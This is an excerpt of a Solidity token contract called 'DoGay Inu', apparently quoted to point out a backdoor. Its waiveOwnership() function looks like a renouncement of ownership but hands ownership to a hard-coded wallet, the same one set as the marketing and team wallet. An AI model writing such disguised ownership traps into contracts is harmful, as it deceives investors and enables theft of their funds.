...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x8431E02Bef77EADdbe8d121ef57c17fF0118650a);
    }
...
contract DoGayInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DoGay Inu";
    string private _symbol = "DGAY";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x8431E02Bef77EADdbe8d121ef57c17fF0118650a);
    address payable private teamWalletAddress = payable(0x8431E02Bef77EADdbe8d121ef57c17fF0118650a);
